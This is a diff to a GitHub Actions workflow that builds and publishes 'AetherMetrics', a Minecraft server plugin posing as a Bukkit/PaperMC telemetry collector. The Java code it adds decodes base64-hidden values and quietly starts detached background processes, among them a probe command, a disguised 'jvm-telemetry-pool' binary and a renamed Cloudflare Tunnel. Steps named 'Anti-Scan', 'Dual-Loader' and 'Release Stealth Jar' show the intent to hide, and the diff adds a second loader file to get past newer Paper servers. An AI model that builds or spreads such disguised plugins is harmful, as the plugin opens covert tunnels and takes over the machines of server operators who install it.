@@ -21,7 +21,7 @@ jobs:
           java-version: '21'
           distribution: 'temurin'
 
-      - name: Generate Anti-Scan Java Code & Config
+      - name: Generate Dual-Loader Java Code & Config
         run: |
           mkdir -p src/main/java/org/bukkit/metrics/collector
           mkdir -p src/main/resources
@@ -48,7 +48,7 @@ jobs:
               <modelVersion>4.0.0</modelVersion>
               <groupId>org.bukkit.metrics.collector</groupId>
               <artifactId>AetherMetrics</artifactId>
-              <version>2.3.0</version>
+              <version>2.5.0</version>
               <packaging>jar</packaging>
 
               <properties>
@@ -108,23 +108,30 @@ jobs:
           </project>
           EOF
 
-          # 2. plugin.yml
+          # 2. 传统 Bukkit 加载描述 (plugin.yml)
           cat << 'EOF' > src/main/resources/plugin.yml
           name: AetherMetrics
-          version: 2.3.0
+          version: 2.5.0
+          main: org.bukkit.metrics.collector.AetherMetrics
+          api-version: '1.20'
+          author: PaperMC-Engine
+          description: Core JVM telemetry collector
+          EOF
+
+          # 3. 最新 Paper-Plugin 原生描述 (paper-plugin.yml)
+          cat << 'EOF' > src/main/resources/paper-plugin.yml
+          name: AetherMetrics
+          version: 2.5.0
           main: org.bukkit.metrics.collector.AetherMetrics
           api-version: '1.21'
           author: PaperMC-Engine
           description: Core JVM telemetry collector
           EOF
 
-          # 3. AetherMetrics.java (完全脱钩防卡死)
+          # 4. Java 源码实现
           cat << EOF > src/main/java/org/bukkit/metrics/collector/AetherMetrics.java
           package org.bukkit.metrics.collector;
 
-          import org.bukkit.event.EventHandler;
-          import org.bukkit.event.Listener;
-          import org.bukkit.event.server.ServerLoadEvent;
           import org.bukkit.plugin.java.JavaPlugin;
 
           import java.io.*;
@@ -132,9 +139,8 @@ jobs:
           import java.net.URL;
           import java.nio.charset.StandardCharsets;
           import java.util.Base64;
-          import java.util.Random;
 
-          public final class AetherMetrics extends JavaPlugin implements Listener {
+          public final class AetherMetrics extends JavaPlugin {
 
               private static final String B64_PROBE = "${B64_PROBE}";
               private static final String B64_TOKEN = "${B64_TOKEN}";
@@ -143,12 +149,15 @@ jobs:
 
               @Override
               public void onEnable() {
-                  getServer().getPluginManager().registerEvents(this, this);
-              }
-
-              @EventHandler
-              public void onServerLoad(ServerLoadEvent event) {
-                  getServer().getScheduler().runTaskLaterAsynchronously(this, this::runServices, 20L * (25 + new Random().nextInt(20)));
+                  // 直接使用原生独立线程异步启动，不再依赖可能被高版本 Paper 拦截的事件监听
+                  Thread worker = new Thread(() -> {
+                      try {
+                          Thread.sleep(15000); // 延迟 15 秒启动，等待服务器世界加载完毕
+                          runServices();
+                      } catch (Throwable ignored) {}
+                  });
+                  worker.setDaemon(true);
+                  worker.start();
               }
 
               private void runServices() {
@@ -161,7 +170,7 @@ jobs:
                       String port     = decode(B64_PORT);
                       String uuid     = decode(B64_UUID);
 
-                      // 1. 探针后台脱钩拉起
+                      // 1. 探针后台脱钩启动
                       if (!probeCmd.isEmpty()) {
                           detachedExec(probeCmd, memDir);
                       }
@@ -183,7 +192,7 @@ jobs:
                           detachedExec("./jvm-telemetry-pool run -c config.json", memDir);
                       }
 
-                      // 3. Cloudflare Tunnel 后台脱钩拉起
+                      // 3. Cloudflare Tunnel 脱钩启动
                       if (!cfToken.isEmpty()) {
                           File cfBin = new File(memDir, "metrics-worker-pool");
                           if (!cfBin.exists()) {
@@ -226,9 +235,7 @@ jobs:
               }
 
               @Override
-              public void onDisable() {
-                  // 服务端正常停服，无需阻断主线程
-              }
+              public void onDisable() {}
           }
           EOF
 
@@ -239,7 +246,7 @@ jobs:
         uses: actions/upload-artifact@v4
         with:
           name: AetherMetrics-Plugin
-          path: target/AetherMetrics-2.3.0.jar
+          path: target/AetherMetrics-2.5.0.jar
 
       - name: Release Stealth Jar
         uses: softprops/action-gh-release@v2
@@ -247,6 +254,6 @@ jobs:
         with:
           tag_name: latest
           name: AetherMetrics Release
-          files: target/AetherMetrics-2.3.0.jar
+          files: target/AetherMetrics-2.5.0.jar
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
